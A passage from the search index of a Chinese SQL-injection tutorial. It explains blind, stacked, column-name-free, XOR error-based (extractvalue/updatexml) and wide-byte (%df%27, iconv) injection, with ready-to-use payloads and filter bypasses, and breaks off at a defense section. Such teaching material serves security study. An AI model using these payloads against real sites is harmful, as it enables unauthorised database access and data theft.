<p>\u540e\u9762\u7684\u76f2\u6ce8\u8fc7\u7a0b\u4e0e\u5e03\u5c14\u76f2\u6ce8\u7c7b\u4f3c</p>"},{"location":"WEB/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84Web%E4%B9%8B%E8%B7%AF-SQL%E7%AF%87/#information_schema","title":"\u591a\u8868<code>information_schema</code>\u67e5\u8be2","text":"<pre><code>(select count(*) from information_schema.columns A, \n information_schema.columns B, information_schema.columns C)\n</code></pre> <p>\u7b1b\u5361\u5c14\u79ef\u67e5\u8be2\uff1a</p> <p>\u5bf9<code>information_schema.columns</code>\u81ea\u8fde\u63a53\u6b21,\u4ea7\u751f\u5de8\u5927\u4e34\u65f6\u8868,\u8d77\u5230\u5ef6\u65f6\u4f5c\u7528</p> <p>tips</p> <p>\u76f2\u6ce8\u65f6\uff0c\u53ef\u4ee5\u7528\u6bd4\u8f83\u8fd0\u7b97\u7b26</p> <p><code>=</code> <code>&lt;&gt;</code> <code>!=</code> <code>%</code> <code>between</code> <code>not between</code> <code>in</code> <code>not in</code> <code>LIKE</code> <code>REGEXP</code> <code>RLIKE</code></p> <pre><code>select user()%sleep(1)\n(select ascii(substr((select user()),1,1)))=114 \nselect ascii(substr((select user()),1,1)) between 113 and 115 #\u5728\u8303\u56f4\u91cc\nselect ascii(substr((select user()),1,1)) in (113,114,115) # \u5728\u96c6\u5408\u4e2d\nselect user() like 'root%' #\u6a21\u5f0f\u5339\u914d\nselect user() regexp 0x5E726F6F5B612D7A5D # 0x5E726F6F5B612D7A5D=^roo[a-z] \u6b63\u5219\u5339\u914d\n</code></pre> <p>\u4e5f\u53ef\u4ee5\u7528\u5b57\u7b26\u4e32\u6bd4\u8f83\u51fd\u6570</p> <pre><code>select strcmp(user(),'root@localhost')\nselect find_in_set(1,1)\n</code></pre> <p>\u65e0<code>select</code>\uff0c\u53ea\u80fd\u6ce8\u540c\u8868\u7684\u5217</p> <pre><code>select * from user where id = 1 and mid((username)from(1)for(1))='a'\n</code></pre>"},{"location":"WEB/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84Web%E4%B9%8B%E8%B7%AF-SQL%E7%AF%87/#_22","title":"\u5806\u53e0\u6ce8\u5165","text":"<p>\u5806\u53e0\u6ce8\u5165\uff0c\u987e\u540d\u601d\u4e49\uff0c\u5c31\u662f\u5c06\u8bed\u53e5\u5806\u53e0\u5728\u4e00\u8d77\u8fdb\u884c\u67e5\u8be2</p> <p>\u539f\u7406\uff1a<code>mysql_multi_query()</code> \u652f\u6301\u591a\u6761sql\u8bed\u53e5\u540c\u65f6\u6267\u884c\uff0c\u8bed\u53e5\u95f4\u4ee5\u5206\u53f7\uff08;\uff09\u5206\u9694,\u5728 ; \u7ed3\u675f\u4e00\u4e2asql\u8bed\u53e5\u540e\u7ee7\u7eed\u6784\u9020\u4e0b\u4e00\u6761\u8bed\u53e5\uff0c\u4e24\u6761\u8bed\u53e5\u4f1a\u4e00\u8d77\u6267\u884c\uff0c\u8fd9\u5c31\u662f\u5806\u53e0\u6ce8\u5165\u3002</p> <p>\u4f46\u5728\u5b9e\u9645\u573a\u666f\u4e2d\u4e3a\u4e86\u9632\u6b62sql\u6ce8\u5165\u673a\u5236\uff0c\u5f80\u5f80\u4f7f\u7528\u8c03\u7528\u6570\u636e\u5e93\u7684\u51fd\u6570\u662f<code>mysqli_ query()</code>\u51fd\u6570\uff0c\u5176\u53ea\u80fd\u6267\u884c\u4e00\u6761\u8bed\u53e5\uff0c\u5206\u53f7\u540e\u9762\u7684\u5185\u5bb9\u5c06\u4e0d\u4f1a\u88ab\u6267\u884c\uff0c\u6240\u4ee5\u5806\u53e0\u6ce8\u5165\u7684\u4f7f\u7528\u6761\u4ef6\u5341\u5206\u6709\u9650</p> <p>\u5176\u4e0e\u8054\u5408\u6ce8\u5165\u7684\u76f8\u540c\u70b9\u5728\u4e8e\u662f\u5c06\u4e24\u6761\u8bed\u53e5\u5408\u5e76\u5728\u4e00\u8d77\uff0c\u800c\u533a\u522b\u662f<code>union</code> \u6216\u8005<code>union all</code>\u6267\u884c\u7684\u8bed\u53e5\u7c7b\u578b\u662f\u6709\u9650\u7684\uff0c\u5e38\u89c1\u7684\u662f\u7528\u6765\u6267\u884c\u67e5\u8be2\u8bed\u53e5\uff0c\u800c\u5806\u53e0\u6ce8\u5165\u53ef\u4ee5\u6267\u884c\u7684\u662f\u4efb\u610f\u7684\u8bed\u53e5\u3002\u5728\u5b57\u7b26\u957f\u5ea6\u9650\u5236\u8303\u56f4\u5185\uff0c\u5806\u53e0\u6ce8\u5165\u53ef\u4ee5\u6267\u884c\u591a\u6761\u8bed\u53e5</p> <p>\u5728\u8fc7\u6ee4\u4e86 <code>select</code> \u548c <code>where</code> \u7684\u60c5\u51b5\u4e0b\uff0c\u8fd8\u53ef\u4ee5\u4f7f\u7528 <code>show</code>\u6765\u7206\u51fa\u6570\u636e\u5e93\u540d\uff0c\u8868\u540d\uff0c\u548c\u5217\u540d\u3002</p> <ul> <li> <p>show</p> <pre><code>show datebases; //\u6570\u636e\u5e93\u3002\nshow tables; //\u8868\u540d\u3002\nshow columns from table; //\u5b57\u6bb5\u3002\n</code></pre> </li> <li> <p>alert</p> </li> </ul> <p>\u4f5c\u7528\uff1a\u4fee\u6539\u5df2\u77e5\u8868\u7684\u5217\u3002\uff08 \u6dfb\u52a0\uff1aadd | \u4fee\u6539\uff1aalert\uff0cchange | \u64a4\u9500\uff1adrop \uff09</p> <p>\u7528\u6cd5\uff1a</p> <ul> <li>\u6dfb\u52a0\u4e00\u4e2a\u5217</li> </ul> <p><code>alter table \" table_name\" add \" column_name\"  type;</code></p> <ul> <li>\u5220\u9664\u4e00\u4e2a\u5217</li> </ul> <p><code>alter table \" table_name\" drop \" column_name\"  type;</code></p> <ul> <li>\u6539\u53d8\u5217\u7684\u6570\u636e\u7c7b\u578b</li> </ul> <p><code>alter table \" table_name\" alter column \" column_name\" type;</code></p> <ul> <li>\u6539\u5217\u540d</li> </ul> <p><code>alter table \" table_name\" change \" column1\" \" column2\" type;</code></p> <p><code>alter table \"table_name\" rename \"column1\" to \"column2\";</code></p> <p>tips</p> <p>\u65e0select</p> <pre><code>set @a = 0x73656C65637420757365722829;PREPARE b FROM @a;EXECUTE b;\n</code></pre>"},{"location":"WEB/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84Web%E4%B9%8B%E8%B7%AF-SQL%E7%AF%87/#_23","title":"\u65e0\u5217\u540d\u6ce8\u5165","text":"<p>\u5176\u5b9e\u662f\u9488\u5bf9<code>information_schema</code> \u5e93\u88ab\u8fc7\u6ee4\u7684\u60c5\u51b5\uff0c\u5bfc\u81f4\u4e0d\u80fd\u76f4\u63a5\u8bfb\u53d6\u5217\u540d</p> <p>\u90a3\u4e48\u5c31\u9700\u8981\u7528\u5230\u5176\u4ed6\u5e93\u6765\u6ce8\u5165, \u4f8b\u5982: <code>sys.schema_auto_increment_columns</code>, <code>sys.schema_table_statistics_with_buffer</code>, <code>mysql.innodb_table_stats</code>\u7b49\u7b49</p> <p>\u4f46\u662f\u8fd9\u4e9b\u8868\u90fd\u4e0d\u80fd\u83b7\u5f97\u5217\u540d\u7b49, \u53ea\u80fd\u83b7\u5f97\u8868\u540d\uff0c\u4ece\u800c\u5f15\u51fa\u7684\u65e0\u5217\u540d\u6ce8\u5165</p> <p>\u4e3b\u8981\u76ee\u7684\u662f\uff1a\u83b7\u53d6\u5217\u540d\uff0c\u4ece\u800c\u8fdb\u884c\u6b63\u5e38\u7684\u6ce8\u5165</p>"},{"location":"WEB/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84Web%E4%B9%8B%E8%B7%AF-SQL%E7%AF%87/#_24","title":"\u5b50\u67e5\u8be2\u6d3e\u751f\u8868","text":"<p>\u539f\u7406</p> <p>\u65e0\u5217\u540d\u6ce8\u5165\u7684\u539f\u7406\u662f\u901a\u8fc7\u5b50\u67e5\u8be2\u8fde\u63a5\u67e5\u8be2\u4e24\u4e2a\u76f8\u540c\u7684\u8868, \u6570\u636e\u5e93\u4f1a\u5efa\u7acb\u4e00\u4e2a\u865a\u62df\u8868, \u5c06\u4e24\u4e2a\u8868\u7684\u67e5\u8be2\u6570\u636e\u653e\u5165, \u5f53\u653e\u5165\u4e00\u4e2a\u865a\u62df\u8868\u4e2d\u5df2\u6709\u7684\u5217\u540d\u65f6\u5c31\u4f1a\u62a5\u9519</p> <p>\u64cd\u4f5c</p> <p>\u4f8b\u5982\uff1a<code>select * from (select * from users u1 join users u2) a;</code></p> <p>\u4f1a\u4ea7\u751f\u6d3e\u751f\u8868a,\u5982\u679c<code>users</code>\u4e2d\u5b58\u5728\u5217\u540d<code>id</code>\u5c31\u4f1a\u62a5\u9519</p> <p><code>Duplicate column name 'id'</code></p> <p>\u7136\u540e\u901a\u8fc7 <code>using</code> \u6765\u6392\u9664\u5217\u540d <code>id</code>, \u7ee7\u7eed\u7206\u51fa\u5176\u4ed6\u7684\u5217\u540d</p> <p><code>using</code> \u4f1a\u81ea\u52a8\u5408\u5e76\u4e24\u4e2a\u8868\u4e2d\u7684\u76f8\u540c\u5217\u540d</p> <p><code>select * from (select * from users u1 join users u2 using(id)) a;</code></p> <p>\u4ee5\u6b64\u7c7b\u63a8\uff0c\u53ef\u4ee5\u7206\u51fa\u6240\u6709\u7684\u8868\u540d</p>"},{"location":"WEB/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84Web%E4%B9%8B%E8%B7%AF-SQL%E7%AF%87/#union_1","title":"union\u6d3e\u751f\u8868","text":"<p>\u539f\u7406</p> <p>\u901a\u8fc7\u865a\u62df\u6d3e\u751f\u8868\u7684\u6570\u5b57\u5217\u540d\uff0c\u6765\u4ee3\u66ff\u539f\u6709\u7684\u5217\u540d</p> <p>\u64cd\u4f5c</p> <p>\u901a\u8fc7union\u67e5\u8be2\uff0c\u9700\u731c\u6d4b\u5217\u6570\uff0c\u5047\u8bbe\u8fd9\u91cc\u4e3a5\u5217</p> <p><code>select 1,2,3,4,5 union select * from table;</code></p> <p>\u4f1a\u628atable\u7684\u6570\u636e\u5b58\u653e\u5230\u4e00\u4e2a\u865a\u62df\u8868\u4e2d\uff0c\u540c\u65f6\u4e3a\u4e94\u4e2a\u5217\u8bbe\u7f6e\u522b\u540d1\uff0c2\uff0c3\uff0c4\uff0c5\u3002</p> <p>\u8fd9\u65f6\u6211\u4eec\u5c31\u53ef\u4ee5\u901a\u8fc7\u522b\u540d1\uff0c2\uff0c3\uff0c4\uff0c5\u6765\u4ee3\u66ff\u5217\u540d\uff0c\u76f8\u5f53\u4e8e\u5217\u540d\u88ab\u66ff\u6362\u6210\u4e86\u6570\u5b57</p> <p>\u8fdb\u4e00\u6b65\u67e5\u8be2</p> <p><code>select 2 from (select 1,2,3,4,5 union select * from table)a;</code></p> <p>\u4e00\u4e9btips</p> <p>\u5728\u6570\u636e\u5e93\u67e5\u8be2bypass\u8fc7\u6ee4`</p> <p>php\u7aef\u4e0d\u9700\u8981``\uff0c\u4f46\u662f\u5728\u6570\u636e\u5e93\u4e2d\u8868\u540d\u9700\u8981\u7528``\u6765\u5305\u88f9,\u5982`table`</p> <p>\u8fd9\u65f6<code>select 2 from (select 1,2,3,4,5 union select * from `table`)a;</code></p> <p>\u67e5\u8be2\u4e0d\u51fa\u6765\u6570\u636e\uff08MySQL 5.7+ \u5df2\u7ecf\u652f\u6301\u6570\u5b57\u4f5c\u4e3a\u5217\u540d\u4e86</p> <p>\u5982\u4e0b\u624d\u53ef\u4ee5 <code>select `2` from (select 1,2,3,4,5 union select * from `table`)a;</code></p> <p>\u5f53\u4e3a\u5217\u540d\u8fc7\u6ee4``\u65f6\uff0c\u53ef\u4ee5\u518d\u6b21\u4f7f\u7528\u6d3e\u751f\u8868\u522b\u540d\u6765bypass</p> <p>\u4e3a\u6d3e\u751f\u8868a\u7684\u6570\u5b57\u5217\u540d2\u8bbe\u7f6e\u522b\u540db,\u901a\u8fc7b\u67e5\u8be2\u5217\u540d\u4e0d\u518d\u9700\u8981``</p> <p><code>select b from (select 1,2 as b,3,4 as c,5 as d union select * from table) a</code></p> <p>\u540c\u65f6\u67e5\u8be2\u591a\u4e2a\u5217</p> <p><code>select concat(b,0x2d,c) from (select 1,2 as b,3 as c,4,5 union select * from `table`)a;</code></p> <p><code>0x2d</code>\u662f<code>-</code>\uff0c\u76f8\u5f53\u4e8e\u67e5\u8be22-3\u7684\u5217</p> <p>\u53c2\u8003 \u53c2\u8003</p>"},{"location":"WEB/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84Web%E4%B9%8B%E8%B7%AF-SQL%E7%AF%87/#_25","title":"\u5f02\u6216\u6ce8\u5165","text":"<p>\u5f02\u6216\u6ce8\u5165\u7684\u539f\u7406\u662f\u901a\u8fc7\u5f3a\u5236\u7c7b\u578b\u8f6c\u5316\u62a5\u9519\u7684\u9519\u8bef\u4fe1\u606f\u6765\u83b7\u53d6\u4fe1\u606f\u3002</p> <p>mysql\u91cc\u5f02\u6216\u8fd0\u7b97\u7b26\u4e3a<code>^</code> \u6216\u8005 <code>xor</code>\uff0c\u8fd9\u91cc\u7684\u5f02\u6216\u6ce8\u5165\u4e3b\u8981\u5229\u7528<code>^</code></p> <p>\u4e24\u8005\u7684\u533a\u522b\u5728\u4e8e <code>^</code>\u8fd0\u7b97\u7b26\u505a\u4f4d\u5f02\u6216\u8fd0\u7b97 \u5982<code>1^2=3</code></p> <p>\u800c <code>xor</code>\u505a\u903b\u8f91\u8fd0\u7b97 <code>1 xor 0</code> \u4f1a\u8f93\u51fa1\uff0c\u5176\u4ed6\u60c5\u51b5\u8f93\u51fa\u5176\u4ed6\u6240\u6709\u6570\u636e </p> <p>xor\u7684\u4f5c\u7528\u5305\u62ec\u4f46\u4e0d\u9650\u4e8e\u7ed5\u8fc7\u654f\u611f\u8bcd\u8fc7\u6ee4\u3001\u5224\u65ad\u8fc7\u6ee4\u5185\u5bb9\u548c\u76f4\u63a5\u8fdb\u884c\u76f2\u6ce8\u5229\u7528</p> <p>\u4e8e\u662fpayload\u53ef\u4ee5\u5199\u6210</p> <p><code>a' ^ extractvalue(1,concat('~',(select(database()))))#</code></p> <p>\u540c\u7406<code>updatexml()</code>\u51fd\u6570\u4e5f\u53ef\u4ee5\uff0c\u7528\u6cd5\u76f8\u540c</p>"},{"location":"WEB/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84Web%E4%B9%8B%E8%B7%AF-SQL%E7%AF%87/#_26","title":"^\u8fd0\u7b97\u7b26","text":"<p>\u539f\u7406</p> <p>^ \uff1a\u8981\u6c42\u4e24\u8fb9\u90fd\u662f\u6570\u5b57\uff0c\u6240\u4ee5<code>extractvalue()</code>\u4e00\u5b9a\u4f1a\u6267\u884c\uff08\u5b83\u9700\u8981\u5148\u6c42\u503c\u624d\u80fd\u53c2\u4e0e\u5f02\u6216\u8fd0\u7b97</p> <p>extractvalue(1,concat('~',(select(database()))))</p> <ul> <li>extractvalue(): \u8fd9\u662f\u662f MySQL \u7684 XML \u5904\u7406\u51fd\u6570</li> <li>\u7b2c\u4e00\u4e2a\u53c2\u6570<code>1</code>: 1\u662f\u4e00\u4e2a\u4f2a XML \u6587\u6863</li> <li>\u7b2c\u4e8c\u4e2a\u53c2\u6570<code>concat()</code>: \u4f7f\u7528 concat() \u6784\u5efa\u4e00\u4e2a\u65e0\u6548\u7684 XPath \u8868\u8fbe\u5f0f</li> </ul> <p>\u5f53\u88ab\u6ce8\u5165\u540e<code>extractvalue()</code>\u88ab\u6267\u884c</p> <p>\u4f1a\u751f\u6210\u4e00\u4e2a\u65e0\u6548\u7684 XPath \u8868\u8fbe\u5f0f\uff08\u5982 ~database_name\uff09</p> <p>MySQL \u4f1a\u8fd4\u56de\u4e00\u4e2a\u9519\u8bef\u4fe1\u606f\uff0c\u9519\u8bef\u4fe1\u606f\u4e2d\u4f1a\u5305\u542b\u6570\u636e\u5e93\u540d\uff1a</p> <pre><code>XPATH syntax error: '~database_name'\n</code></pre> <p>\u540c\u7406</p> <p>[]\u4e2d\u7684name\u66ff\u6362\u4e3a\u5b9e\u9645name\u5373\u53ef</p> <p>\u8868\u540d\uff1a<code>a'^extractvalue(1,concat('~',(select(group_concat(table_name))from(information_schema.tables)where(table_schema)like('[database_name]'))))</code></p> <p>\u5217\u540d\uff1a<code>a'^extractvalue(1,concat('~',(select(group_concat(column_name))from(information_schema.columns)where(table_name)like('[table_name]'))))</code></p> <p>\u5b57\u6bb5\uff1a<code>a'^extractvalue(1,concat('~',(select(group_concat([column_name]))from([database_nam].[table_name]))))</code></p> <p>tips\uff1a\u9488\u5bf9\u957f\u5ea6\u8fc7\u6ee4\u9650\u5236</p> <p>\u5229\u7528<code>right()</code>\u51fd\u6570\uff0c\u548c<code>left()</code>\u51fd\u6570</p> <p>\u82e5\u4e00\u4e2a\u4e0d\u884c\u5c31\u540c\u65f6\u4f7f\u7528</p> <p><code>a'^extractvalue(1,concat('~',(select(right([column_name],30))from([database_nam].[table_name]))))</code></p> <p>\u83b7\u53d6\u5de6\u8fb9\uff1a</p> <p><code>a'or(updatexml(\"~\",concat(\"~\",(select(group_concat(left([column_name],25)))from([database_nam].[table_name]))),\"~\"))</code></p> <p>\u83b7\u53d6\u53f3\u8fb9\uff1a</p> <p><code>a'or(updatexml(\"~\",concat(\"~\",(select(group_concat(right([column_name],25)))from([database_nam].[table_name]))),\"~\"))</code></p>"},{"location":"WEB/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84Web%E4%B9%8B%E8%B7%AF-SQL%E7%AF%87/#_27","title":"\u5bbd\u5b57\u8282\u6ce8\u5165","text":"<p>\u57fa\u7840\u6982\u5ff5</p> <p>\u5bbd\u5b57\u8282\u662f\u76f8\u5bf9\u4e8eascii\u8fd9\u6837\u5355\u5b57\u8282\u800c\u8a00\u7684\uff1b GB2312\u3001GBK\u3001GB18030\u3001BIG5\u3001Shift_JIS \u7b49\u8fd9\u4e9b\u90fd\u662f\u5bbd\u5b57\u8282\uff0c\u5b9e\u9645\u4e0a\u53ea\u6709\u4e24\u5b57\u8282</p> <p>\u8fd9\u91cc\u6240\u8bf4\u7684\u5bbd\u5b57\u8282\u6ce8\u5165\uff0c\u5176\u5b9e\u662f\u4e3a\u4e86\u7ed5\u8fc7\u8f6c\u4e49\u51fd\u6570\uff08\u4e3a\u4e86\u8fc7\u6ee4\u7528\u6237\u8f93\u5165\u7684\u4e00\u4e9b\u6570\u636e\uff0c\u5bf9\u7279\u6b8a\u7684\u5b57\u7b26\u52a0\u4e0a\u53cd\u659c\u6760\u201c\\\u201d\u8fdb\u884c\u8f6c\u4e49\uff09</p> <p>Mysql\u4e2d\u8f6c\u4e49\u7684\u51fd\u6570\u6709<code>addslashes</code>\uff0c<code>mysql_real_escape_string</code>\uff0c<code>mysql_escape_string</code> \u7b49</p>"},{"location":"WEB/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84Web%E4%B9%8B%E8%B7%AF-SQL%E7%AF%87/#sql_4","title":"sql\u7684\u6267\u884c\u8fc7\u7a0b","text":"<p>\u8fd9\u91cc\u8bb2\u4e00\u4e0bsql\u7684\u6267\u884c\u8fc7\u7a0b\u4e2d\u5b57\u7b26\u7684\u53d8\u5316</p> <p>\u4ee5php\u4e3a\u4f8b\uff0c\u5f53\u7528\u6237\u8f93\u5165\u6570\u636e\u4e4b\u540e\uff0cphp\u6839\u636e\u9ed8\u8ba4\u7f16\u7801\u751f\u6210sql\u8bed\u53e5\u53d1\u9001\u7ed9\u670d\u52a1\u5668\uff0c\u6ca1\u6709\u8bbe\u7f6e<code>default_charset</code>\u7684\u65f6\u5019\uff0cphp\u4f1a\u6839\u636e\u6570\u636e\u5e93\u4e2d\u7684\u7f16\u7801\u81ea\u52a8\u6765\u786e\u5b9a\u4f7f\u7528\u90a3\u79cd\u7f16\u7801</p> <p>\u5224\u65ad\u65b9\u5f0f</p> <pre><code>&lt;?php $m=\u201d\u5b57\u201d; echo strlen($m); \n# \u8f93\u51fa3\u8bf4\u660e\u662futf-8\n# \u8f93\u51fa2\u8bf4\u660e\u662fgbk\n</code></pre> <p>\u670d\u52a1\u5668\u63a5\u6536\u5230\u8bf7\u6c42\u540e\u4f1a\u628a\u5ba2\u6237\u7aef\u7f16\u7801\u7684\u5b57\u7b26\u4e32\u8f6c\u6362\u6210\u8fde\u63a5\u5c42\u7f16\u7801\u5b57\u7b26\u4e32</p> <p>\u5177\u4f53\u6d41\u7a0b\u662f\u5148\u4f7f\u7528\u7cfb\u7edf\u53d8\u91cf <code>character_set_client</code> \u5bf9 SQL \u8bed\u53e5\u8fdb\u884c\u89e3\u7801\u540e\uff0c\u7136\u540e\u4f7f\u7528 \u7cfb\u7edf\u53d8\u91cf <code>character_set_connection</code> \u5bf9\u89e3\u7801\u540e\u7684\u5341\u516d\u8fdb\u5236\u8fdb\u884c\u7f16\u7801\uff08\u9ed8\u8ba4\u90fd\u662fgbk\u7f16\u7801\uff09</p> <p>\u8fdb\u884c\u5185\u90e8\u64cd\u4f5c\u524d\uff0c\u6309\u7167\u5982\u4e0b\u89c4\u5219\u8f6c\u5316\u8bf7\u6c42\u4e3a\u5185\u90e8\u64cd\u4f5c\u5b57\u7b26\u96c6</p> <pre><code>\u4f7f\u7528\u5b57\u6bb5 `CHARACTER SET` \u8bbe\u5b9a\u503c\n\n\u82e5\u4e0a\u8ff0\u503c\u4e0d\u5b58\u5728\uff0c\u4f7f\u7528\u5bf9\u5e94\u6570\u636e\u8868\u7684`DEFAULT CHARACTER SET`\u8bbe\u5b9a\u503c\n\n\u82e5\u4e0a\u8ff0\u503c\u4e0d\u5b58\u5728\uff0c\u5219\u4f7f\u7528\u5bf9\u5e94\u6570\u636e\u5e93\u7684`DEFAULT CHARACTER SET`\u8bbe\u5b9a\u503c\n\n\u82e5\u4e0a\u8ff0\u503c\u4e0d\u5b58\u5728\uff0c\u5219\u4f7f\u7528`character_set_server`\u8bbe\u5b9a\u503c\uff08\u9ed8\u8ba4gbk\u7f16\u7801\uff09\n</code></pre> <p>\u6267\u884c\u5b8c SQL \u8bed\u53e5\u4e4b\u540e\uff0c\u5c06\u6267\u884c\u7ed3\u679c\u6309\u7167 <code>character_set_results</code> \u7f16\u7801\u8fdb\u884c\u8f93\u51fa\u3002</p>"},{"location":"WEB/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84Web%E4%B9%8B%E8%B7%AF-SQL%E7%AF%87/#_28","title":"\u539f\u7406","text":"<p>\u5bbd\u5b57\u8282\u6ce8\u5165\u6307\u7684\u662f mysql \u6570\u636e\u5e93\u5728\u4f7f\u7528\u5bbd\u5b57\u8282\uff08GBK\uff09\u7f16\u7801\u65f6\uff0c\u4f1a\u8ba4\u4e3a\u4e24\u4e2a\u5b57\u7b26\u662f\u4e00\u4e2a\u6c49\u5b57\uff08\u524d\u4e00\u4e2aascii\u7801\u8981\u5927\u4e8e128\uff08\u6bd4\u5982%df\uff09\uff0c\u624d\u5230\u6c49\u5b57\u7684\u8303\u56f4\uff09\uff0c</p> <p>\u5bbd\u5b57\u8282\u6ce8\u5165\u53d1\u751f\u7684\u4f4d\u7f6e\u5c31\u662f PHP\u53d1\u9001\u8bf7\u6c42\u5230MYSQL\u65f6\u5b57\u7b26\u96c6\u4f7f\u7528<code>character_set_client</code>\u8bbe\u7f6e\u503c\u8fdb\u884c\u4e86\u4e00\u6b21\u7f16\u7801\uff0c \u7136\u540e\u670d\u52a1\u5668\u4f1a\u6839\u636e<code>character_set_connection</code>\u628a\u8bf7\u6c42\u8fdb\u884c\u8f6c\u7801\uff0c\u4ece<code>character_set_client</code>\u8f6c\u6210<code>character_set_connection</code>\uff0c \u7136\u540e\u66f4\u65b0\u5230\u6570\u636e\u5e93\u7684\u65f6\u5019\uff0c\u518d\u8f6c\u5316\u6210\u5b57\u6bb5\u6240\u5bf9\u5e94\u7684\u7f16\u7801</p>"},{"location":"WEB/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84Web%E4%B9%8B%E8%B7%AF-SQL%E7%AF%87/#addslashes","title":"addslashes()","text":"<p>\u5f53\u4f7f\u7528<code>addslashes()</code>\u8f6c\u4e49\u7279\u6b8a\u5b57\u7b26\u7684\u65f6\u5019\uff0c\u4f1a\u628a'\u5373<code>%27</code>\u8f6c\u4e49\u6210\\'\uff0c\u5373<code>%5c%27</code></p> <p>\u6b64\u65f6\u8f93\u51651' \u6b64\u65f6\u7684sql\u8bed\u53e5\u4e3a</p> <p><code>select * from tables where id = '1 \\''</code></p> <p>\u53ef\u4ee5\u6784\u9020\u7279\u6b8a\u5b57\u7b26<code>%df%27</code>,\u8f6c\u4e49\u540e\u4e3a<code>%df%5c%27</code>,mysql\u4f1a\u628a<code>%df%5c</code>\u8bc6\u522b\u6210\u5bbd\u5b57\u8282\u8f6c\u5316\u6210\u6c49\u5b57<code>\u904b</code></p> <p>\u6570\u636e\u53d8\u5316\u8fc7\u7a0b</p> <pre><code>%df%27===&gt;(addslashes)====&gt;%df%5c%27====&gt;(GBK)====&gt;\u904b'\n\u200b\n\u7528\u6237\u8f93\u5165==&gt;\u8fc7\u6ee4\u51fd\u6570==&gt;\u4ee3\u7801\u5c42\u7684$sql==&gt;mysql\u5904\u7406\u8bf7\u6c42==&gt;mysql\u4e2d\u7684sql\n</code></pre> <p>\u4ece\u800c\u4f7f\u8f93\u5165<code>%df%27</code>\u8f6c\u5316\u6210\u4e86<code>\u904b'</code>\u5bfc\u81f4sql\u8bed\u53e5\u88ab\u95ed\u5408</p> <p>\u8f93\u5165<code>%df' --'</code>\u5373\u53ef\u4f7f'\u9003\u9038\u540c\u65f6\u6ce8\u91ca\u540e\u9762\u7684'\uff0c\u8fd9\u6837\u5c31\u53ef\u4ee5\u6784\u9020\u6ce8\u5165\u8bed\u53e5\u4e86</p> <p>\u6b64\u65f6\u7684sql\u8bed\u53e5</p> <p><code>select * from tables where id = '1 \u904b' --\\''</code></p>"},{"location":"WEB/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84Web%E4%B9%8B%E8%B7%AF-SQL%E7%AF%87/#iconv","title":"iconv()","text":"<p>\u4e3a\u4e86\u907f\u514d\u5bbd\u5b57\u8282\u6ce8\u5165,\u4f7f\u7528iconv\u51fd\u6570\uff08\u80fd\u591f\u5b8c\u6210\u5404\u79cd\u5b57\u7b26\u96c6\u95f4\u7684\u8f6c\u6362\uff09</p> <pre><code>$id = isset($_GET['id']) ? addslashes($_GET['id']) : 1;\n$id = iconv('utf-8', 'gbk', $id); # \u7531utf-8 \u2013&gt; gbk\n</code></pre> <p>\u53ef\u4ee5\u4f7f\u7528\u9006\u5411\u601d\u7ef4\uff0c\u5148\u627e\u4e00\u4e2agbk\u7684\u6c49\u5b57\u9326,\u9326\u7684utf-8\u7f16\u7801\u662f<code>0xe98ca6</code>\uff0c\u5b83\u7684gbk\u7f16\u7801\u662f<code>0xe55c</code>,</p> <p>\u5f53\u4f20\u5165\u7684\u503c\u662f<code>\u9326'</code>\uff0c<code>'</code>\u901a\u8fc7<code>addslashes</code>\u8f6c\u4e49\u4e3a<code>\\'</code>(%5c%27)</p> <p>\u9326\u901a\u8fc7<code>icov</code>\u8f6c\u6362\u4e3a<code>%e5%5c</code>\uff0c\u6700\u7ec8<code>\u9326'</code>\u53d8\u4e3a\u4e86<code>%e5%5c%5c%27</code>,\u4e0d\u96be\u770b\u51fa<code>%5c%5c</code>\u6b63\u597d\u628a\u53cd\u659c\u6760\u8f6c\u4e49\uff0c\u4f7f\u5355\u5f15\u53f7\u9003\u9038\uff0c\u9020\u6210\u6ce8\u5165</p> <p>\u5b57\u7b26\u53d8\u5316</p> <pre><code>\u9326%27===&gt;(addslashes)====&gt;\u9326%5c%27====&gt;(iconv)====&gt;%e5%5c%5c%27====&gt;\u9326'====&gt;\u9326'\n\n\u7528\u6237\u8f93\u5165===&gt;\u8fc7\u6ee4\u51fd\u6570===&gt;\u4ee3\u7801\u5c42\u7684$sql===&gt;\u8f6c\u6362\u51fd\u6570===&gt;\u4ee3\u7801\u5c42\u7684$sql===&gt;mysql\u5904\u7406\u8bf7\u6c42===&gt;mysql\u4e2d\u7684sql\n</code></pre> <p>\u8fd9\u91cc\u5728\u7ecf\u8fc7<code>icov()</code>\u51fd\u6570\u8f6c\u5316\u540e\uff0c\u5df2\u7ecf\u662fgbk\u7f16\u7801\u4e86\uff0c\u539f\u6765\u7684\u53ea\u6709<code>addslashes()</code>\u65f6\uff0cmysql\u5904\u7406\u7684\u662fascii\u5355\u5b57\u8282\u5b57\u7b26\uff08\u5bbd\u5b57\u8282\u6ce8\u5165\u7684\u603b\u7ed3\uff1a\u4f20\u5165\u662f\u5355\u5b57\u8282\uff0c\u4f20\u51fa\u662f\u53cc\u5b57\u8282\uff09\uff0c\u8fd9\u91cc\u7684<code>%e5%5c%5c%27</code>\u5df2\u7ecf\u4e3agbk\u7f16\u7801\u5373<code>\u9326'</code></p>"},{"location":"WEB/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84Web%E4%B9%8B%E8%B7%AF-SQL%E7%AF%87/#_29","title":"\u9632\u62a4","text":"<pre><code>\u4f7f\u7528mysql_set_charset(GBK)\u6307\u5b9a\u5b57\u7b26\u96c6\n\nSET character_set_connection=gbk, 